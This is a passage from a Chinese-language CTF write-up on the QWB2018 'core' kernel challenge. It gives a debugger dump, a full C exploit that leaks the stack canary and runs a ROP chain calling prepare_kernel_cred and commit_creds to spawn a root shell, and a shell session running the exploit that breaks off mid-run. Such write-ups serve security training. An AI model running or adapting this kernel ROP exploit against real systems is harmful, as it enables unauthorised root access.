+LEGEND: STACK <span class="p">|</span> HEAP <span class="p">|</span> CODE <span class="p">|</span> DATA <span class="p">|</span> RWX <span class="p">|</span> RODATA
+──────────────────────────────────────<span class="o">[</span> REGISTERS <span class="o">]</span>──────────────────────────────────────
+ RAX  0xffffffffc018b15f <span class="o">(</span>core_ioctl<span class="o">)</span> ◂— cmp    esi, 0x6677889b /* 0x48536677889bfe81 */
+ RBX  0x7ffee6e56f10 ◂— <span class="m">0</span>
+ RCX  0x0
+ RDX  0x7ffee6e56f10 ◂— <span class="m">0</span>
+ RDI  0x7ffee6e56f10 ◂— <span class="m">0</span>
+ RSI  0x6677889b
+ R8   0xffff8f25071b38ac ◂— <span class="m">1</span>
+ R9   0x1
+ R10  0x0
+ R11  0x0
+ R12  0xffff8f250540b7a0 ◂— mov    dh, 0x81 /* 0x581b6 */
+ R13  0x6677889b
+ R14  0x7ffee6e56f10 ◂— <span class="m">0</span>
+ R15  0x0
+ RBP  0x7ffee6e56f10 ◂— <span class="m">0</span>
+ RSP  0xffffb0f3800dbe68 —▸ 0xffffffffc018b19b <span class="o">(</span>core_ioctl+60<span class="o">)</span> ◂— 0xc7c748d6894818eb
+ RIP  0xffffffffc018b063 <span class="o">(</span>core_read<span class="o">)</span> ◂— push   rbx /* 0x7bc7c748fb894853 */
+───────────────────────────────────────<span class="o">[</span> DISASM <span class="o">]</span>────────────────────────────────────────
+ ► 0xffffffffc018b063 &lt;core_read&gt;       push   rbx
+   0xffffffffc018b064 &lt;core_read+1&gt;     mov    rbx, rdi
+   0xffffffffc018b067 &lt;core_read+4&gt;     mov    rdi, -0x3fe73f85
+   0xffffffffc018b06e &lt;core_read+11&gt;    sub    rsp, 0x48
+   0xffffffffc018b072 &lt;core_read+15&gt;    mov    rax, qword ptr gs:<span class="o">[</span>0x28<span class="o">]</span>
+   0xffffffffc018b07b &lt;core_read+24&gt;    mov    qword ptr <span class="o">[</span>rsp + 0x40<span class="o">]</span>, rax
+   0xffffffffc018b080 &lt;core_read+29&gt;    xor    eax, eax
+   0xffffffffc018b082 &lt;core_read+31&gt;    call   0xffffffffa16c6845
+
+   0xffffffffc018b087 &lt;core_read+36&gt;    mov    rsi, qword ptr <span class="o">[</span>rip + 0x2b72<span class="o">]</span>
+   0xffffffffc018b08e &lt;core_read+43&gt;    mov    rdx, rbx
+   0xffffffffc018b091 &lt;core_read+46&gt;    mov    rdi, -0x3fe73f6b
+────────────────────────────────────────<span class="o">[</span> STACK <span class="o">]</span>────────────────────────────────────────
+<span class="m">00</span>:0000│ rsp  0xffffb0f3800dbe68 —▸ 0xffffffffc018b19b <span class="o">(</span>core_ioctl+60<span class="o">)</span> ◂— 0xc7c748d6894818eb
+<span class="m">01</span>:0008│      0xffffb0f3800dbe70 —▸ 0xffff8f25071b3840 ◂— add    qword ptr <span class="o">[</span>r8<span class="o">]</span>, rax /* 0x81b6f000014b */
+<span class="m">02</span>:0010│      0xffffb0f3800dbe78 —▸ 0xffffffffa17dd6d1 ◂— 0xe824048948df8948
+<span class="m">03</span>:0018│      0xffffb0f3800dbe80 ◂— 0x889b
+<span class="m">04</span>:0020│      0xffffb0f3800dbe88 —▸ 0xffff8f2507680d00 ◂— <span class="m">0</span>
+<span class="m">05</span>:0028│      0xffffb0f3800dbe90 —▸ 0xffffffffa178ecfa ◂— 0x9e840ffffffdfd3d
+<span class="m">06</span>:0030│      0xffffb0f3800dbe98 —▸ 0xffffb0f3800dbe70 —▸ 0xffff8f25071b3840 ◂— add    qword ptr <span class="o">[</span>r8<span class="o">]</span>, rax /* 0x81b6f000014b */
+<span class="m">07</span>:0038│      0xffffb0f3800dbea0 ◂— 0x10
+Breakpoint core_read
+pwndbg&gt;</code></pre></td></tr></table>
+</div>
+</div>
+<p>最终 exp</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span><span class="lnt">143
+</span><span class="lnt">144
+</span><span class="lnt">145
+</span><span class="lnt">146
+</span><span class="lnt">147
+</span><span class="lnt">148
+</span><span class="lnt">149
+</span><span class="lnt">150
+</span><span class="lnt">151
+</span><span class="lnt">152
+</span><span class="lnt">153
+</span><span class="lnt">154
+</span><span class="lnt">155
+</span><span class="lnt">156
+</span><span class="lnt">157
+</span><span class="lnt">158
+</span><span class="lnt">159
+</span><span class="lnt">160
+</span><span class="lnt">161
+</span><span class="lnt">162
+</span><span class="lnt">163
+</span><span class="lnt">164
+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="n">QWB2018_core</span> <span class="p">[</span><span class="n">master</span><span class="err">●●</span><span class="p">]</span> <span class="n">cat</span> <span class="n">exploit</span><span class="p">.</span><span class="n">c</span> 
+<span class="c1">// gcc exploit.c -static -masm=intel -g -o exploit
+</span><span class="c1"></span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;sys/ioctl.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="kt">void</span> <span class="n">spawn_shell</span><span class="p">()</span>
+<span class="p">{</span>
+	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">getuid</span><span class="p">())</span>
+	<span class="p">{</span>
+		<span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/sh&#34;</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="k">else</span>
+	<span class="p">{</span>
+		<span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*]spawn shell error!&#34;</span><span class="p">);</span>
+	<span class="p">}</span>
+	<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="n">size_t</span> <span class="n">commit_creds</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">prepare_kernel_cred</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="n">size_t</span> <span class="n">raw_vmlinux_base</span> <span class="o">=</span> <span class="mh">0xffffffff81000000</span><span class="p">;</span>
+<span class="cm">/* 
+</span><span class="cm"> * give_to_player [master●●] check ./core.ko
+</span><span class="cm">   ./core.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=549436d
+</span><span class="cm">   [*] &#39;/home/m4x/pwn_repo/QWB2018_core/give_to_player/core.ko&#39;
+</span><span class="cm">       Arch:     amd64-64-little
+</span><span class="cm">       RELRO:    No RELRO
+</span><span class="cm">       Stack:    Canary found
+</span><span class="cm">       NX:       NX enabled
+</span><span class="cm">       PIE:      No PIE (0x0)
+</span><span class="cm">*/</span>
+<span class="n">size_t</span> <span class="n">vmlinux_base</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="n">size_t</span> <span class="nf">find_symbols</span><span class="p">()</span>
+<span class="p">{</span>
+	<span class="n">FILE</span><span class="o">*</span> <span class="n">kallsyms_fd</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;/tmp/kallsyms&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
+	<span class="cm">/* FILE* kallsyms_fd = fopen(&#34;./test_kallsyms&#34;, &#34;r&#34;); */</span>
+
+	<span class="k">if</span><span class="p">(</span><span class="n">kallsyms_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*]open kallsyms error!&#34;</span><span class="p">);</span>
+		<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+	<span class="p">}</span>
+
+	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x30</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+	<span class="k">while</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="n">kallsyms_fd</span><span class="p">))</span>
+	<span class="p">{</span>
+		<span class="k">if</span><span class="p">(</span><span class="n">commit_creds</span> <span class="o">&amp;</span> <span class="n">prepare_kernel_cred</span><span class="p">)</span>
+			<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+
+		<span class="k">if</span><span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;commit_creds&#34;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">commit_creds</span><span class="p">)</span>
+		<span class="p">{</span>
+			<span class="cm">/* puts(buf); */</span>
+			<span class="kt">char</span> <span class="n">hex</span><span class="p">[</span><span class="mi">20</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+			<span class="n">strncpy</span><span class="p">(</span><span class="n">hex</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
+			<span class="cm">/* printf(&#34;hex: %s\n&#34;, hex); */</span>
+			<span class="n">sscanf</span><span class="p">(</span><span class="n">hex</span><span class="p">,</span> <span class="s">&#34;%llx&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">commit_creds</span><span class="p">);</span>
+			<span class="n">printf</span><span class="p">(</span><span class="s">&#34;commit_creds addr: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">commit_creds</span><span class="p">);</span>
+			<span class="cm">/*
+</span><span class="cm">			 * give_to_player [master●●] bpython
+</span><span class="cm">				bpython version 0.17.1 on top of Python 2.7.15 /usr/bin/n
+</span><span class="cm">				&gt;&gt;&gt; from pwn import *
+</span><span class="cm">				&gt;&gt;&gt; vmlinux = ELF(&#34;./vmlinux&#34;)
+</span><span class="cm">				[*] &#39;/home/m4x/pwn_repo/QWB2018_core/give_to_player/vmli&#39;
+</span><span class="cm">				    Arch:     amd64-64-little
+</span><span class="cm">				    RELRO:    No RELRO
+</span><span class="cm">				    Stack:    Canary found
+</span><span class="cm">				    NX:       NX disabled
+</span><span class="cm">				    PIE:      No PIE (0xffffffff81000000)
+</span><span class="cm">				    RWX:      Has RWX segments
+</span><span class="cm">				&gt;&gt;&gt; hex(vmlinux.sym[&#39;commit_creds&#39;] - 0xffffffff81000000)
+</span><span class="cm">				&#39;0x9c8e0&#39;
+</span><span class="cm">			*/</span>
+			<span class="n">vmlinux_base</span> <span class="o">=</span> <span class="n">commit_creds</span> <span class="o">-</span> <span class="mh">0x9c8e0</span><span class="p">;</span>
+			<span class="n">printf</span><span class="p">(</span><span class="s">&#34;vmlinux_base addr: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">vmlinux_base</span><span class="p">);</span>
+		<span class="p">}</span>
+
+		<span class="k">if</span><span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;prepare_kernel_cred&#34;</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">prepare_kernel_cred</span><span class="p">)</span>
+		<span class="p">{</span>
+			<span class="cm">/* puts(buf); */</span>
+			<span class="kt">char</span> <span class="n">hex</span><span class="p">[</span><span class="mi">20</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+			<span class="n">strncpy</span><span class="p">(</span><span class="n">hex</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span>
+			<span class="n">sscanf</span><span class="p">(</span><span class="n">hex</span><span class="p">,</span> <span class="s">&#34;%llx&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">prepare_kernel_cred</span><span class="p">);</span>
+			<span class="n">printf</span><span class="p">(</span><span class="s">&#34;prepare_kernel_cred addr: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">prepare_kernel_cred</span><span class="p">);</span>
+			<span class="n">vmlinux_base</span> <span class="o">=</span> <span class="n">prepare_kernel_cred</span> <span class="o">-</span> <span class="mh">0x9cce0</span><span class="p">;</span>
+			<span class="cm">/* printf(&#34;vmlinux_base addr: %p\n&#34;, vmlinux_base); */</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+
+	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">prepare_kernel_cred</span> <span class="o">&amp;</span> <span class="n">commit_creds</span><span class="p">))</span>
+	<span class="p">{</span>
+		<span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*]Error!&#34;</span><span class="p">);</span>
+		<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+	<span class="p">}</span>
+
+<span class="p">}</span>
+
+<span class="n">size_t</span> <span class="n">user_cs</span><span class="p">,</span> <span class="n">user_ss</span><span class="p">,</span> <span class="n">user_rflags</span><span class="p">,</span> <span class="n">user_sp</span><span class="p">;</span>
+<span class="kt">void</span> <span class="nf">save_status</span><span class="p">()</span>
+<span class="p">{</span>
+	<span class="n">__asm__</span><span class="p">(</span><span class="s">&#34;mov user_cs, cs;&#34;</span>
+			<span class="s">&#34;mov user_ss, ss;&#34;</span>
+			<span class="s">&#34;mov user_sp, rsp;&#34;</span>
+			<span class="s">&#34;pushf;&#34;</span>
+			<span class="s">&#34;pop user_rflags;&#34;</span>
+			<span class="p">);</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*]status has been saved.&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">set_off</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">idx</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*]set off to %ld</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span>
+	<span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x6677889C</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">core_read</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buf</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*]read to buf.&#34;</span><span class="p">);</span>
+	<span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x6677889B</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+
+<span class="p">}</span>
+
+<span class="kt">void</span> <span class="nf">core_copy_func</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">size</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*]copy from user with size: %ld</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+	<span class="n">ioctl</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x6677889A</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+	<span class="n">save_status</span><span class="p">();</span>
+	<span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/proc/core&#34;</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*]open /proc/core error!&#34;</span><span class="p">);</span>
+		<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+	<span class="p">}</span>
+	
+	<span class="n">find_symbols</span><span class="p">();</span>
+	<span class="c1">// gadget = raw_gadget - raw_vmlinux_base + vmlinux_base;
+</span><span class="c1"></span>	<span class="n">ssize_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">vmlinux_base</span> <span class="o">-</span> <span class="n">raw_vmlinux_base</span><span class="p">;</span>
+
+	<span class="n">set_off</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">);</span>
+
+	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x40</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+	<span class="n">core_read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
+	<span class="n">size_t</span> <span class="n">canary</span> <span class="o">=</span> <span class="p">((</span><span class="n">size_t</span> <span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[+]canary: %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">canary</span><span class="p">);</span>
+
+	<span class="n">size_t</span> <span class="n">rop</span><span class="p">[</span><span class="mh">0x1000</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+
+	<span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+	<span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+	<span class="p">{</span>
+		<span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">canary</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff81000b2f</span> <span class="o">+</span> <span class="n">offset</span><span class="p">;</span> <span class="c1">// pop rdi; ret
+</span><span class="c1"></span>	<span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">prepare_kernel_cred</span><span class="p">;</span>			<span class="c1">// prepare_kernel_cred(0)
+</span><span class="c1"></span>
+	<span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff810a0f49</span> <span class="o">+</span> <span class="n">offset</span><span class="p">;</span> <span class="c1">// pop rdx; ret
+</span><span class="c1"></span>	<span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff81021e53</span> <span class="o">+</span> <span class="n">offset</span><span class="p">;</span> <span class="c1">// pop rcx; ret
+</span><span class="c1"></span>	<span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff8101aa6a</span> <span class="o">+</span> <span class="n">offset</span><span class="p">;</span> <span class="c1">// mov rdi, rax; call rdx; 
+</span><span class="c1"></span>	<span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_creds</span><span class="p">;</span>
+	
+	<span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff81a012da</span> <span class="o">+</span> <span class="n">offset</span><span class="p">;</span> <span class="c1">// swapgs; popfq; ret
+</span><span class="c1"></span>	<span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+	<span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0xffffffff81050ac2</span> <span class="o">+</span> <span class="n">offset</span><span class="p">;</span> <span class="c1">// iretq; ret; 
+</span><span class="c1"></span>
+	<span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">size_t</span><span class="p">)</span><span class="n">spawn_shell</span><span class="p">;</span>			<span class="c1">// rip 
+</span><span class="c1"></span>	
+	<span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_cs</span><span class="p">;</span>
+	<span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rflags</span><span class="p">;</span>
+	<span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
+	<span class="n">rop</span><span class="p">[</span><span class="n">i</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>
+
+	<span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">rop</span><span class="p">,</span> <span class="mh">0x800</span><span class="p">);</span>
+	<span class="n">core_copy_func</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mh">0xffffffffffff0000</span> <span class="o">|</span> <span class="p">(</span><span class="mh">0x100</span><span class="p">));</span>
+
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span></code></pre></td></tr></table>
+</div>
+</div>
+<h4 id="get-root-shell-1">get root shell</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">QWB2018_core <span class="o">[</span>master●●<span class="o">]</span> gcc exploit.c -static -masm<span class="o">=</span>intel -g -o exploit // 如果使用 intel 汇编需要加上 -masm<span class="o">=</span>intel 
+QWB2018_core <span class="o">[</span>master●●<span class="o">]</span> cp exploit give_to_player/core/tmp
+cp：是否覆盖<span class="s1">&#39;give_to_player/core/tmp/exploit&#39;</span>？ y
+QWB2018_core <span class="o">[</span>master●●<span class="o">]</span> <span class="nb">cd</span> give_to_player/core
+core <span class="o">[</span>master●●<span class="o">]</span> ./gen_cpio.sh core.cpio
+.
+./usr
+./usr/sbin
+......
+......
+
+core <span class="o">[</span>master●●<span class="o">]</span> mv core.cpio ..
+mv：是否覆盖<span class="s1">&#39;../core.cpio&#39;</span>？ y
+core <span class="o">[</span>master●●<span class="o">]</span> <span class="nb">cd</span> ..
+give_to_player <span class="o">[</span>master●●<span class="o">]</span> ./start.sh
+
+/ $ ls /tmp/
+exploit   kallsyms
+/ $ id
+<span class="nv">uid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>chal<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>chal<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span><span class="m">1000</span><span class="o">(</span>chal<span class="o">)</span>
+/ $ /tmp/exploit
+<span class="o">[</span>*<span class="o">]</span>status has been saved.
+commit_creds addr: 0xffffffffbd09c8e0
+vmlinux_base addr: 0xffffffffbd000000
+prepare_kernel_cred addr: 0xffffffffbd09cce0
+<span class="o">[</span>*<span class="o">]</span><span class="nb">set</span> off to <span class="m">64</span>
